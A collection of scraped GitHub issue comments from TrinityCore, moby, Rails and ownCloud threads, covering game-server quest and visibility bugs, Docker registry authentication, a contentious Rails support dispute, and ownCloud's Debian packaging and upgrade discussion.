Woods.;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;22775;22776;22777;0;0;0;1;1;1;0;0;0;1;;;;;0;0;0;0;0;0;0;0;0;1;0;0;0;0;0;0;0;0;12340 &lt;code&gt; 9395;2;9;8;0;3430;0;0;0;0;690;0;0;0;0;0;0;0;0;0;0;9255;0;0;9067;1;0;60;0;0;0;0;0;0;0;0;0;136;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;911;0;0;0;0;1;0;0;0;0;0;0;0;0;0;0;0;0;0;Saltheril's Haven;Speak with Lord Saltheril at Saltheril's Haven in Eversong Woods.;I swear that I'm going to fireball someone if I get one more request from Lord Saltheril concerning supplies for his party!  Do I look like a party planner?!  Between you and me, that fool and his sycophants are living in denial that we're under attack here!$B$BSome of us are actually busy with, oh, I don't know, defending what's left of Quel'Thalas!  $C, would you please head over to Saltheril's Haven and see if you can shut him up?  It's just down the road to the west.;;Ah, good of Magistrix Dawnstrider to finally respond to my simple requests.  I should take up the matter of her attitude with the regent lord in Silvermoon. She's quite rude!$B$BNothing for you to concern yourself with though. Now that you're here, maybe I'll finally be able to get those party supplies that I've been waiting for? ;;;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;0;1;;;;;0;0;0;0;0;0;0;0;0;1;0;0;0;0;0;0;0;0;12340 ",,False,False,11476
TrinityCore/TrinityCore/11476/32740672,Quest 2 is the one that does not trigger after quest 1 is complete with all requirements met but quest 3 does trigger when manually adding quest 2 ,,False,False,11476
TrinityCore/TrinityCore/11476/32740786,Research Notes is quest 1 yes ,,False,False,11476
TrinityCore/TrinityCore/11476/32740831,"Interestingly, that isn't listed as part of the chain, not on Wowhead or in the 4.3.4 database. I wonder if that's the error going on. ",,False,False,11476
TrinityCore/TrinityCore/11476/32740915,I can no longer trust wow head because wowhead is claiming this quest only existed since 4.0.1 but this quest is from the launch of BC as part of the blood elf starter quests. but it could be the issue ,,False,False,11476
TrinityCore/TrinityCore/11476/32741241,"For future reference, you can use something like  to get an SQL output. There may be other options to add, to strip out the unnecessary information, or just manually copy/paste the appropriate parts of the output. ",,False,False,11476
TrinityCore/TrinityCore/11476/32742364,oh yeah? thanks yeah I'm not very fluent in mysql query building ,,False,False,11476
TrinityCore/TrinityCore/11476/32745859,Everything works fine and the first quest in the chain is  !!! ,,False,False,11476
TrinityCore/TrinityCore/11476/32746175,hmm i'll try again i'll make a new character and start it all over again ,,False,False,11476
TrinityCore/TrinityCore/11476/32746262,I did forget to post my build though TrinityCore rev. 939a25346b57 TDB 335.52 ,,False,False,11476
moby/moby/18569/121489632,"Docker (1.9.1) only checks for 401 HTTP status code on  but it will not attempt authentication on later 401 status response codes. My use case our registry needs to allow unauthenticated pulls (therefore will return 200 on ), but it requires authentication on ""push"". Docker client version 1.9.1 Used registry  client will print ""&lt;nil&gt;"" on the console instead of attempting authentication (as it should).  ",,False,False,18569
rails/rails/33009/327090891,"I'm trying to learn about how to enqueue jobs into Rails as a ""background"" task, and the documentation on this topis is really not clear. Maybe someone can help me, and help update the docs. From here  What file should that function go into? Does it get called when the server starts? When does it get called? I want a function that will get called when the server starts. How do I do that? Yep, that's exactly what I want. How do I use the ""in-process"" queuing system to start a function that will run in RAM? There is no detail about that in the docs, it appears. I would like to not have to call every one of my ""background"" processes by hand when I start my server... ",,False,False,33009
rails/rails/33009/392581587,"Please use StackOverflow for questions/help, where a wider community will be able to help you. We reserve the issues tracker for issues only. ",,False,False,33009
rails/rails/33009/392582223,"StackOverflow is a really, really horrible forum. Is this a joke? Basic functionality questions are not allowed? The issue is about your documentation and the fact that it doesn't answer BASIC USER QUESTIONS! ",,False,False,33009
rails/rails/33009/392582533,"The fact that you guys offer no help at all and just force close issues is really upsetting. Horrible moderatorship, horrible repo maintenance, honestly. ",,False,False,33009
rails/rails/33009/392583588,"I don't think rafaelfranca should be moderating here. I'd ask a more senior member to step in and help, please. ",,False,False,33009
rails/rails/33009/392588443,"Feel free to improve the documentation. Rails is made by volunteer efforts. Some times the documentation will not answer some questions. Some times those questions don't belongs to the documentation. There are plenty of books that could answer your questions. The first questions are basic, I agree and the answer for them are Any file were you need to schedule a job. It could be in a controller, in a model, in an initializer, in a library, etc. It depends on where you put it. If you put in an initializer it will run after the application initializes. I think I answered that question above.  and make sure you are using the right job adapter. Your questions are about usage of the Ruby on Rails framework, and looks like you missing some knowledge about how rails works. I can point to you some other pages in the guides that could help you to build the knowledge to come up with the answers for those questions by yourself.  you think this should be in the documentation, please do investigate and contribute back. Now for the second set of questions No. And I'll explain in the next answer. It is not. As you can see in the Contributing file that GitHub linked to you before you opened the issue, questions about Ruby on Rails usage are not allowed on the issue tracker. We have different forums for that. One of them in Stack Overflow. If you don't like it you can use the rails-talk mailing list linked in the contributing file. I don't think this is a documentation problem, but indeed it doesn't answer all basic user questions since it can't. It is a best effort. It can answer some of the questions but some questions it will have to expect users to be able to look on other sources like books, blog posts and other guides pages in order to build the knowledge that is missing to understand how to use it. That is also your opinion and you are entitled to have it, but also consider that, like I said above, Rails is made by volunteers, and by a limited number of people. If we would be answering basic user questions for everyone that have them, neither if that was our full time job it would be possible to be able to help everyone. This is why we direct people to other forums like Stack Overflow where a wider community can be able to help. Last, but not least, as per our license THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED. Even that my colleagues locked the conversations because they do think your comments were too heated, I'll unlock in case you want to rethink your attitude and, given all information and reasons that I gave you to close this issue, you want to suggest improvements. ",,False,False,33009
rails/rails/33009/392607129,"Although @friend was a bit aggressive, I do agree with his opinion on StackOverflow.  SO usually is toxic and rarely does it provide meaningful feedback which could help with a complex issue (e.g I've been facing rather strange issue with Rails 5.2 after updating from 5.1.4 and I wasn't able to get any feedback on it on SO or the mailing list, but I won't go into details here and instead will keep waiting and researching). The mailing list is also rather empty and I doubt many people actually read it. I do love the IRC channel but at times it's hard to keep track of a conversation. In comparison to the Elixir community, I feel like it's harder to get help and feedback on the issues you're facing with Rails. I'd love to see an equivalent of the elixirforum for our community. But anyways, we all love and appreciate all the effort and time put into Rails, the ruby ecosystem, and our somewhat-loving community, by awesome volunteers like you, @friend. ",,False,False,33009
rails/rails/33009/392610382,"That is a valid point @friend. I think we as a community can improve the level of support, but I really believe that GitHub is not the right place for questions about usage of software, and waiting to core member to reply those questions doesn't scale. Food for thought why the mailing list is empty and people don't read it? Would introducing a forum improve the participation? My guess the problem lays on the answers for the first question. We as a community should use the appropriated forums to help newcomers, answer questions, help each other. That responsibility is mine, yours and of everyone that is part of this community. So, if the mailing list is empty, let's fill it. If nobody reads it, let's read and reply to set the example. If people don't provide meaningful help, let's be the ones that will. As someone that had all this support when started to use rails I really believe it is possible and it doesn't require a team of 12 people to be the only ones providing this support. ",,False,False,33009
rails/rails/33009/392699451,"HOW??? HOW DO I ""ENQUEUE"" JOBS??? For the love of god, people. Just giving me a function prototype and telling me ""put it anywhere"" doesn't help. Why don't I use the mailing list? Because it's not anonymous. Same problem with IRC, it's really painful to use without giving up your IP address and network route. Plus, I really and truly BELIEVE that GITHUB is the place for user questions related to a repo! Why? Because it archives, and because you actually interface with the devs responsible for the project. ",,False,False,33009
rails/rails/33009/392701728,"I guess I'll just keep searching and trying and trying whatever random stuff I find. I'm trying to start a socket monitor with the server, parse and broadcast socket messages. I want it to automatically start with the server, and run basically like a daemon. If it dies, it would be nice it it comes back to life, eventually. If anyone can offer some advise over where to look, I'd appreciate it. I can't make heads or tails of the official documentation about the ""queue"" system. It seems to indicate there is some way to put jobs in some sort of queue, but it's not real clear on HOW. ",,False,False,33009
rails/rails/33009/392711424,Here's an unanswered thread on StackOverflow. I added my question there and the mods promptly deleted it. Great. ,,False,False,33009
rails/rails/33009/392715187,"I think I need something more like this  I think that one page about how the ""enqueue"" jobs is just super-confusing and threw me for a loop, sorry. ",,False,False,33009
rails/rails/33009/392732537,"@friend That's indeed true and I agree. Hard to say, I read the mailing list whenever I get a notification but most of the time I do not have an answer to the question or issue that the user is having, so in the back of my mind I just say ""Someone else will handle it"". I think this ""someone else will do it"" approach is an issue and I know that I'm not the only one that does it, unfortunately. I also believe that the mailing list is rather dull looking, and as we know, fancy stuff make people want to get involved most of the time. @friend Quite the opposite, I believe that section of the documentation does what it's supposed to do. It explains how to enque the job. And the section below it explains how to execute the jobs, which I believe is what you were looking for. In all honesty, I think you need to relax a bit and not be so aggressive.  Issues can be frustrating but it does no good to be mean to people. ",,False,False,33009
rails/rails/33009/392893356,"Also, in regards to the user docs, they need work. The section on ""queueing"" is really, really confusing. I was looking for how to make a process run at startup, and run basically as a daemon, and that page threw me for a complete loop. It needs to include detail on how to actually make processes run on a desired schedule, not just at some nebulous ""time in the future"". ",,False,False,33009
rails/rails/33009/392961139,"You are fine to disagree, but your aggressiveness, even though, I respectfully unlock the conversation so we could actually have a discussion with respect, actually bought you a permanent ban of the rails issue tracker. Enjoy! ",,False,False,33009
TrinityCore/TrinityCore/8105/7639977,"Core revision  7cc1b999a6f69056e88ffce04d2f26de292a6e11 Description  Console error with Object Update Failed between players, resulting in player being invisible for others. Happens randomly and sometimes whole packet is skipped for that player. All other objects are visible. Did some testing on it and seems sometimes logging out both players which don't see each other solves it, sometimes a server restart and other times changing the location of both players can do it. This can happen in two different ways  if there is only player a and b player a doesn't see player b or other way around /  both players don't see each other; if there are more players some players can see that player  but for some object update fails and they can't see him at all / player can't see some of the other players.  Example Object update failed for object 436 (Воil) for player Leikov (213) Object update failed for object 32 (Мentos) for player Leikov  (213) Object update failed for object 184 (Larvy) for player Leikov  (213) Object update failed for object 234 (Мilna) for player Leikov  (213) Object update failed for object 1373 (Wilson) for player Leikov  (213) Object update failed for object 1391 (Death) for player Leikov  (213) Object update failed for object 234 (Мilna) for player Leikov  (213). ",,False,False,8105
TrinityCore/TrinityCore/8105/10187203,"This seems to happen also for pets, totems or in case of raid buffs. Maybe it is aura-related in some way? Anyone got anything new on this? ",,False,False,8105
TrinityCore/TrinityCore/8105/10526526,confirmed ,,False,False,8105
TrinityCore/TrinityCore/8105/10722939,"Could this be due to limitation of player update fields sent to other players ( I mean these commits  /  ? I played around with it a bit and observed that modifying the number of update fields sent / sending them all can reproduce the bug each time two or more players meet, can something be bad there ? ",,False,False,8105
TrinityCore/TrinityCore/8105/10928815,"Seems to be a wrong packet structure being send i think, if you check it handles the CMSG opcode that is being received and calsl the object failed. Soooo this could be because the packet has been sended wrong? ",,False,False,8105
TrinityCore/TrinityCore/8105/10956434,@friend prolly not. Objects/Npcs keep disappearing as well once 2 or more players reach in sight. ,,False,False,8105
TrinityCore/TrinityCore/8105/11679686,any temp solution? ,,False,False,8105
TrinityCore/TrinityCore/8105/11721605,None that I know of as of now ;( ,,False,False,8105
TrinityCore/TrinityCore/8105/11778063,"anyone can help me, does it possible to make in game command, witch can repop player update? so it basicly make ppl visible if they use that command? ",,False,False,8105
TrinityCore/TrinityCore/8105/11803531,"Still wondering who is assigning issue priorities.. Without object update working as intended there's no way to even play the game,but it's better to have spells as a higher priority..huh. ",,False,False,8105
TrinityCore/TrinityCore/8105/11820344,"You are NOT supposed to use the 4.3.4 branch for production environments, it IS in alpha / beta state, and WILL have bugs. We (devs) work on whatever we WANT to work on, whatever is FUN for us to work on, not on some ""important"" bug because it prevents people from creating 4.3.4 private servers ",,False,False,8105
TrinityCore/TrinityCore/8105/11825222,"I don't really care,I've fixed that on my local. Just wondering of whom is assigning priorities no matter the branch's current state as he clearly isn't paying attention or is just ignorant. I didn't say that I expect the 4.3 branch to have no bugs,master has enough already,anyways. And this isn't stopping anyone(or at least me) to get my stuff rolling ;) ",,False,False,8105
TrinityCore/TrinityCore/8105/11829121,@friend What exactly are you doing here? With that shitty attitude you might as well just leave. ,,False,False,8105
TrinityCore/TrinityCore/8105/11833568,"please just be cool anyway hopefuly some devs can look at this, could be nice to have it fixed and IntelFreak share fix? or .. ",,False,False,8105
TrinityCore/TrinityCore/8105/11833668,"You know, that makes us want to stop developing sometimes, you take tons and tons (thousands of lines, according to ohloh) of code, made by us / other contributors, modify it, claim that you have something working, and just don't share it back. ",,False,False,8105
TrinityCore/TrinityCore/8105/11834007,"I do not care about any other user here weaving around aboot some fixes here they made that none of followers of TC can experience. It's crap, it's ignorant and it really ain't nice. I want to just let my fav db dev know that he is best at his work around here, Malcrom D ",,False,False,8105
TrinityCore/TrinityCore/8105/11865175,Would be nice if you mentioned exact steps to reproduce this as i had a hard time trying to figure it out. Im guessing more than 1 player must be involved so i can't test it alone. ,,False,False,8105
TrinityCore/TrinityCore/8105/11939928,"one problem i can reproduce ,  player A duel with player B player A mage cast invisibility, player B stays without move after player A invisibility fades, player A cant see player B until player B move. thats just one visibility bug, but trying to find out other (perma invis until relog) bugs ",,False,False,8105
TrinityCore/TrinityCore/8105/11999117,"that bug with invisibility seems fixed on latest rev, not sure about global player update visibility ",,False,False,8105
TrinityCore/TrinityCore/8105/12161690,@friend can you pls share your fix? ,,False,False,8105
TrinityCore/TrinityCore/8105/13240693,just to confirm bug still there ERROR [NETWORKIO] Object update failed for object 100037876 (Rychard) for player Abnormally (606513) ERROR [NETWORKIO] Object update failed for object 100037876 (Rychard) for player Wlk (586392) ERROR [NETWORKIO] Object update failed for object 100037876 (Rychard) for player Agressive (351952) ERROR [NETWORKIO] Object update failed for object 606513 (Abnormally) for player Rychard (100037876) ERROR [NETWORKIO] Attempted to get value with size 3 in ByteBuffer (pos 2 size 16) [Stack trace /opt/RC_TC/bin/worldserver(_ZN12WorldSession6UpdateEjR12PacketFilter+0x8f0) [0xd30000] /opt/RC_TC/bin/worldserver(_ZN5World14UpdateSessionsEj+0x112) [0xdcd0e2] /opt/RC_TC/bin/worldserver(_ZN5World6UpdateEj+0x227) [0xdd2667] /opt/RC_TC/bin/worldserver(_ZN13WorldRunnable3runEv+0x1b4) [0x8de414] /opt/RC_TC/bin/worldserver(_ZN9ACE_Based6Thread10ThreadTaskEPv+0xa) [0xfd681a] /usr/local/lib/libACE-6.0.0.so(_ZN21ACE_OS_Thread_Adapter6invokeEv+0xa5) [0x7f99af463f75] /lib/x86_64-linux-gnu/libpthread.so.0(+0x6d8c) [0x7f99add9ad8c] /lib/x86_64-linux-gnu/libc.so.6(clone+0x6d) [0x7f99adae4fdd] ] ,,False,False,8105
TrinityCore/TrinityCore/8105/13849759,I got this messages when tryin to tame beast (mb cuz last id in character_pet table is rly big?) =) If truncate tables character_pet / pet_aura / pet_spells / pet_spell_cooldown - everything going well... ,,False,False,8105
TrinityCore/TrinityCore/8105/17461522,"still bug, please fix it ",,False,False,8105
TrinityCore/TrinityCore/8105/17824405,"lol, go to AC webs and bump. ",,False,False,8105
TrinityCore/TrinityCore/8105/17956850,is it caused by some commit or that problem is from start? ,,False,False,8105
TrinityCore/TrinityCore/8105/18083554,can someone send file with packet communication on this error? i cant reproduce it on localhost -(  can use this for sniff it works ok ,,False,False,8105
TrinityCore/TrinityCore/8105/19616942,"i could not 100% reproduce the error msg, but after some testing i figured out a stupid bug if you JUMP thru any portal client will stuck at loading screen. I didnt get any error msg for this however. anyway, problem is at Object_BuildMovementUpdate temp solution is to disable jump flags in the update object just comment these two lines hasFallDirection = self-&gt;m_movementInfo.bits.hasFallDirection; hasSplineElevation = self-&gt;m_movementInfo.bits.hasSplineElevation; (it can be found in two places, just below each other) after this, client loading didnt stuck anymore while jumping to portals.. ",,False,False,8105
TrinityCore/TrinityCore/8105/19621136,so jumping while teleport makes you stuck? (someone tryed to reproduce this with jump + .tele? D ,,False,False,8105
TrinityCore/TrinityCore/8105/19623720,"tryed it with tele to other map, no errors, but with jump + instanceportal its a 100% stuck for us ",,False,False,8105
TrinityCore/TrinityCore/8105/19624435,"Confirmed, sometimes also seen on master. ",,False,False,8105
TrinityCore/TrinityCore/8105/19838540,still could not directly reproduce this update fail bug... it comes back randomly tho.. ,,False,False,8105
TrinityCore/TrinityCore/8105/19839573,sniff with data fail (btw you can enably packet logging in core.. no need for sniffer in local..)  with wpp and search for CMSG_OBJECT_UPDATE_FAILED ,,False,False,8105
TrinityCore/TrinityCore/8105/21415529,"@friend is easy to fix it, you need get some functions from update visibility from cmangos (they have implemented, Trinity no), and make some changes for get working it. ",,False,False,8105
TrinityCore/TrinityCore/8105/21416324,Walkum thx for help ,,False,False,8105
TrinityCore/TrinityCore/8105/21482281,@friend that is where you need to fix? Help please. Thank you. ,,False,False,8105
TrinityCore/TrinityCore/8105/21690085,"share fix, please... ( ",,False,False,8105
TrinityCore/TrinityCore/8105/22070324,also looking for solution / ,,False,False,8105
TrinityCore/TrinityCore/8105/22077825,"yeah,  i want to know what code walkum said. ",,False,False,8105
TrinityCore/TrinityCore/8105/22374320,@friend Could you please link to this code or pm me? ,,False,False,8105
TrinityCore/TrinityCore/8105/23044437,Object update failed for object 17371279370823581417 (Doodad_InstanceNewPortal_Purple01) for player Mags (27) Object update failed for object 17371279375118548714 (Doodad_InstanceNewPortal_Purple_Skull01) for player Mags (27) Only I have left? ,,False,False,8105
TrinityCore/TrinityCore/8105/23045287,"this partially fixes visibility, Creatures still sometimes, well a lot of the time don't load up on login/teleport. as well as game objects and players. However players seem to pop up out of the visibility issue over time when they move around/cast w/e. ",,False,False,8105
TrinityCore/TrinityCore/8105/23045702,How to repeat 2 players. player1 .tele gmis player2 .tele zula player2 .sum player1 and immediately press jump PROFIT! ) ,,False,False,8105
TrinityCore/TrinityCore/8105/23047553,player 1 or 2 jumps? ,,False,False,8105
TrinityCore/TrinityCore/8105/23050096,"For me, Spawn creatures on gm island = when you tele there or login creatures are invisible until you do .respawn. ",,False,False,8105
TrinityCore/TrinityCore/8105/23151965,"yep, problem is still here. ",,False,False,8105
TrinityCore/TrinityCore/8105/25647787,"problem still exists afaik... and another way to reproduce, set all speeds to 0 in any creature_Template, it will write the update error ",,False,False,8105
TrinityCore/TrinityCore/8105/25681014,Speeds equal to 0 should not be allowed for any object - client explicitly rejects such objects ,,False,False,8105
TrinityCore/TrinityCore/8105/25695939,"thats fine but in tdb some creatures (cannons?) have speed 0 so players can not move with them. anyway, after cleaning the db of 0 speeds, the update fail error still happens, sometimes for 1 unit, whole instance, or  even for self. i made some changes to the core, all smsg_update_objects packets get stored in vector for each player, and when a player gets the failed error it dumps all packets to a parsable bin file,   it clears the packet list after all smsg_new_world packets (when teleporting) to minimize the number of packets saved. i'll run this for a while then upload the bins here. example Object update failed for object 17379573901861019520 (Orgrimmar Thief) for player Rodneey (8515)  was only 1 SMSG_UPDATE_OBJECT packet in his dump which had the entry of Orgrimmar Thief UNIT_FIELD_HEALTH 0/0 this looks strange to me... how ever, i could not reproduce the bug, the creature has &gt;0 hp in db ",,False,False,8105
TrinityCore/TrinityCore/8105/25703249,"updates_8515_parsed.txt Object update failed for object 17379573901861019520 (Orgrimmar Thief) for player Rodneey (8515) (Unit Entry 42594 Low 1269632 is the npc) updates_27473_parsed.txt Object update failed for object 17379456185396262882 (Murky) for player Tfh (27473) (Unit Entry 15186 Low 161762 is the npc) updates_157003_parsed.txt Object update failed for object 155636 (Flink) for player Chupakabra (157003) updates_153694_parsed.txt Object update failed for object 140454 (Misral) for player Tapolynokill (153694) updates_146553_parsed.txt Object update failed for object 157256 (Tokitozuka) for player Enforced (146553) updates_105663_parsed.txt Object update failed for object 128558 (Epherandes) for player Manigo (105663) updates_122856_parsed.txt Object update failed for object 155636 (Flink) for player Smash (122856) the bugged packet is always the last one in the files zip bins + parsed with wpp, no parse errors ",,False,False,8105
TrinityCore/TrinityCore/8105/25710836,Your method of debugging this is not reliable - client sends CMSG_OBJECT_UPDATE_FAILED when it received VALUES block for an object it cannot see (didn't receive CreateObject or movement block had bad data); this means it will never fail because of bad values in updatefields ,,False,False,8105
TrinityCore/TrinityCore/8105/25711340,"okey, then why arent the create packets sent corretcly? ",,False,False,8105
TrinityCore/TrinityCore/8105/25748161,"The packets sended correctly, but if you send not allowed values by client side in the SMSG_OBJECT_UPDATE (e.g speed=0) the client ignore this object and send to server  CMSG_OBJECT_UPDATE_FAILED, but the problem is fixed, check your database and change the not allowed values to not receive this error ",,False,False,8105
TrinityCore/TrinityCore/8105/25753747,"as i wrote above, there is no npc with speed 0 in db, and most of the errors come from players, i dont think they can have 0 speeds... ",,False,False,8105
TrinityCore/TrinityCore/8105/25765027,What about players that have auras with -100% movement speed? Maybe we are handling these wrong ,,False,False,8105
TrinityCore/TrinityCore/8105/25765127,"No ^^ it's auras which handle Movement ) For ex. Suspend gravity! How do i know? Because i'm working on gunship_battle 4.3.4 and everytime i use movement flag i get that error ^^ Like when you enter the Transport you actually do get an Spell (Aura), that says, that you'r eon the Transport and then it wants to update ",,False,False,8105
TrinityCore/TrinityCore/8105/25767212,"If you have a new way to reproduce it, why don't you tell us what it is? ",,False,False,8105
TrinityCore/TrinityCore/8105/25767470,"didn't i do that before? Try any Spells, which will update the movement of anything.. ",,False,False,8105
TrinityCore/TrinityCore/8105/25768385,"No, I am not getting issues with them, you could at least give me a scenario how to cast it, what to cast, who to target and stuff ",,False,False,8105
TrinityCore/TrinityCore/8105/25788239,"shauren was right, any speed mods which set speed to 0 create errors.. expample spell 102937 Demon Grip Root - 100% speed to reproduce add aura 102937 to a player (should work winth any unit tho) run/fly out of view distance of it go back you will notice that most of 'worldobjects' which were sent in the same packet are not visible you will get the first update failed error if any of those objects send an update example a player unequips an item ",,False,False,8105
TrinityCore/TrinityCore/8105/25805076,"btw, why is this closed? ",,False,False,8105
TrinityCore/TrinityCore/8105/26491988,"did some more tests i logged all speed vars in all create packets, none of them was 0, so this isnt to source of the bug (adding -100% speed auras still reproduce the error, but those are not used in TC currently for any scripts afaik) another thing i tried is, i added a check when core receives the fail packet, and checked m_clientGUIDs for the given guid and m_clientGUIDs always had the guid in list, so the bugged object is always visible from core side for the player so i guess somehow the createblock is not sent to the client any ideas? ",,False,False,8105
TrinityCore/TrinityCore/8105/26514548,"Maybe an error in the order the packets are sent, or they way they are processed by the client? as in, we send the CreateObject first but the client processes the UpdateValues before it? ",,False,False,8105
TrinityCore/TrinityCore/8105/30561553,"i still dont know why is this closed, the bug is still happening as before.. ",,False,False,8105
moby/moby/332/12789670,"There's no way to flatten images right now. When performing a build in multiple steps, a few images can be generated and a larger number of layers is produced. When these are pushed to the registry, a lot of data and a large number of layers have to be downloaded. There are some cases where one starts with a base image (or another image), changes some large files in one step, changes them again in the next and deletes them in the end. This means those files would be stored in 2 separate layers and deleted by whiteout files in the final image. These intermediary layers aren't necessarily useful to others or to the final deployment system. Image flattening should work like this  the history of the build steps needs to be preserved the flattening can be done up to a target image (for example, up to a base image) the flattening should also be allowed to be done completely (as if exporting the image)  ",,False,False,332
moby/moby/332/349283405,"It's been over a year now, any plans to introduce the ""--squash"" option into the CE codebase other than via the ""--experimental"" way. ",,False,False,332
core/owncloud/24232/150802607,"I'm a happy Debian and ownCloud user for a long time now. Today I saw the package being evicted from Debian's repo and I was sad. Digging a little bit around I arrive to things like #22691. In principle the PR is ok, bugs in software package by Debian should first be reported in Debian's BTS and the maintainer should decide whether is part of her patches or it should be forwarded upstream. At least that's how usually should work. Alas, this is not the first time upstream that has problems with bugs reported to things done downstream. I also understand, from what I read, that in this case downstream didn't properly communicate with the ownCloud community, but I don't think that alienating downstream is the best solution. I think a better approach is to apply a variant of Postel's law ""Be open in what you receive, and strict in what you send"". As the Debian maintainer said, 'we’re doing our best to offer it to our users'. One of the things that this implies, more or less, is that the maintainer will try to keep the upgrade path as smooth as possible. In general, Debian has a very good record on upgrade paths, and personally that's why I chose it. Unluckily I can't see the patch because the package has been removed, so I can't help in that particular case. I wish this kind of problems could be solved any time soon, and this is my way to try to make that happen. I appreciate Jos's mail, because it goes in the same direction. As an outsider to the particular problem but also as a developer of database based applications, wouldn't it be possible to apply each individual upgrade script from the original release all the way to the latest one? ",,False,False,24232
core/owncloud/24232/214252515,"@friend You could but each app has its own update scripts. It'd be possible, but it is just a huge amount of work to develop and test on all the databases and stuff ownCloud supports. You're also not unlikely to end up with special bugs that won't show up until you upgrade some day in the future, and they'll be impossible to debug by then. It is just very fragile. A proper solution would require a new updater technology that is more stand-alone and designed to do this - that was introduced in ownCloud 9.0 and might allow stuff like this later in the 9.x series, but bolting that on the older releases is a huge, complex task. The best solution would be to write an independent upgrade script that does it all on its own, supporting all apps and databases. That, too, is a huge task, but less likely to break everything. I wouldn't oppose that last thing but who's going to do the work? For now, I'm writing on a blog post to help ppl manually upgrade from the Debian package to our official 8.0 package, then 8.1, then 8.2 and then they can decide if they want 9.0 already or not. (there is no reason to stick to anything older than 8.2, at least not if you value your data and security). Help testing that how-to would be super welcome... I was hoping to have a draft last week but stuff got in the way, will work on it today. ",,False,False,24232
core/owncloud/24232/214261900,"I see, and I think that what the maintainer tried to do was to solve it the best he could (his own words). Reacting like 'I'd even consider a warning about not using Debian packages on our download page fair enough' is not helping in the discussion. I just wish that for the sake of ownCloud's relationship with distributions you acknowledge it. Maybe some of you think distros are not important ('Don't worry guys, owncloud is going to be removed from Debian anyway and is also planned for Fedora. So this problem is going to resolve itself pretty soon.'), but as a user of both (apps and distros) I assure you most people just use that. In the particular problem, I see you also have upgrade problems. What Iḿ trying to say is that the maintainer is trying his best for the time being, just like you and anybody else. ",,False,False,24232
core/owncloud/24232/214262354,That's outrightly wrong. See  on how Fedora did handle this. The Fedora packagers did actually get in touch with us in advance unlike some other distribution packagers 😉 ,,False,False,24232
core/owncloud/24232/214264890,"@friend I was just quoting. Bravo for Fedora. Also, keeping that attitude doesn't help a little bit. Yes, I agree that there was some kind of miscommunication, but reacting that way does not put you in a good light either. So what I think both sides should do is to get together and work on it. I hope the invitation for the meeting in September is taken, but it's my opinion that should think of other ways to better communicate with downstream. ",,False,False,24232
core/owncloud/24232/214266603,"Hmm, I just noticed the comment I was quoting was probably not from someone from the ownCloud community  that's the case, my mistake. In any case, what he says after that goes in line to what I want to say here. ",,False,False,24232
core/owncloud/24232/214340961,"I know he wanted to solve it the best way he could. But that doesn't make it a good idea. Doing open hart surgery on yourself might be done with great intentions but it's not smart either way. We expressed worries as we ourselves would not feel confident in our own ability to do this and we certainly didn't and don't expect a packager who doesn't even talk to us to do a decent job protecting the data of our users in his free time. Add to that the thought of having to deal with the bug reports and many broken installations and damage to our reputation this would cause and you can imagine why we responded with a ""please don't do this"". That was our 'official' response, not You can't blame us for discussing this internally and people then giving their opinion. That isn't our communication and really, don't expect me to tell people to stop giving their opinion on our own mailing lists, bug tracker and other communication channels. Honestly, I don't think we did anything particularly wrong here. We asked downstream not to risk the data of our users. They got upset and dropped ownCloud packaging. Their right, not our fault. As I said, I'll write a blog to help users migrate from Debian packages to our packages. Feedback and help with that would be welcome. I see no point in doing anything else as the current ownCloud packagers at Debian have made it very clear they don't want to continue working on packages. If somebody else steps up, they'll get the same support anybody else (like Fedora) gets when they ask. We're of course critical of the distribution rules that make packaging ownCloud harder than it needs to be, but that's an entirely different issue and other distributions are starting to move to fix that (eg snappy, Project Atomic, XDG-Apps etc) so in time, Debian will probably become a good place for ownCloud again. With regards to upgrade problems on the ownCloud side sure. ownCloud is very flexible and it is nearly impossible to test all combinations of technologies we support without more help. Our packages aren't perfect either and we're not terribly happy with the deployment options we can give to users. Help with the packages is of course welcome, you can find sources here. If you don't mind I'll close this issue. I'll share steps on upgrading Debian packages here when I've got some, would love to hear if they work and what feedback you have. ",,False,False,24232
core/owncloud/24232/214359934,"Ok, sorry for the confusion, but from a user perspective, I think I just fell into a similar error that would be to report a bug here about the Debian packaging. I think you should try to use a less public method for your internal discussions; the issue being public doesn't help distinguish form an internal discussion. Well, that package version was aimed to , which by default you have to jump over several hoops just to get one package form it. People who use it know things might break, but it's a Debian mechanism to pretest packages. I agree it's not a complete solution and probably a sloppy one. My aim with that paragraph was to highlight that in both sides, like everywhere else, software is always WIP and that you will most always find flaws. Trying to say ""don't point fingers"" I ended pointing a finger, how ironic... ( ",,False,False,24232
core/owncloud/24232/214814716,"@friend don't worry about pointing fingers. Yes, there are issues on all sides, certainly. Sorry if I got overly defensive. About our internal discussions being public - that is a property of open source communities. At least, we like it that way. Our Debian friends made some stingy comments about us on their mailing list too - you won't see me come in and complain about them, I respect that that is the place where they have their discussions and they are free to say what they like. I'd be upset if it ended up in an announcement or if they send it to OUR mailing lists, that's different. What I mean is I see our and their mailing lists and infrastructure as our and their living rooms. With open doors and windows ;-) You can say what you like and if people overhear a conversation and get upset, well, perhaps they shouldn't have gone to that living room. But if you go to somebody else's' living room and yell at them, now THAT is impolite. I know about Experimental but it did show a scary direction development was taking (and even there could lead to data loss issues). Now, as said earlier, I won't say it is impossible to get this right, but we were (and are) very skeptical and then somebody doing it alone... I know, engineers are often like ""how hard could it be"" but the answer usually is ""harder than you thought"". Certainly in this case. ",,False,False,24232
core/owncloud/24232/214814945,"Meanwhile, I'm trying to figure out how to upgrade from the Debian packages to ours. I'm currently guessing the process would be something like this  make a backup of the database (and, if possible, the data folder) backup the config file and move the data folder in a temporary, safe place uninstall the current ownCloud packages install upstream ownCloud 8 packages and put in the data folder and config files run the updater via the command line  Any feedback on that, perhaps? I'd really appreciate help here ;-) ",,False,False,24232
core/owncloud/24232/214817268,@friend Some pointers where given by @friend in ,,False,False,24232
core/owncloud/24232/214819997,thanks for that! ,,False,False,24232
core/owncloud/24232/214830847,See  please ,,False,False,24232
